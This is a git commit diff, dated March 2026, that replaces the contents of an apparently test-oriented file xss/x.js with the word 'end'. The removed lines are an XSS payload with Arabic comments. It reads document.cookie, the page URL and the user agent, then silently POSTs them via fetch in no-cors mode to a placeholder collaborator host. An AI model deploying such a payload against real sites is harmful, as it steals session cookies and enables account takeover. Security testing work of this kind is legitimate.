2b6b52860c91cd0bacd2ca408251a5317764ab9e
RakanNos <136182919+rxx2me@users.noreply.github.com>
2026-03-15 05:22:49 +0300

    Update x.js

--- xss/x.js
+++ xss/x.js
@@ -1,13 +1,1 @@
-// 1. جمع البيانات الحساسة
-var payload = {
-    cookies: document.cookie,
-    admin_url: window.location.href,
-    user_agent: navigator.userAgent
-};
-
-// 2. إرسال البيانات بصمت إلى خادم المخترق
-fetch('https://your-collaborator-url.com/log', {
-    method: 'POST',
-    mode: 'no-cors', // لتجاوز قيود CORS البسيطة
-    body: JSON.stringify(payload)
-});
+end
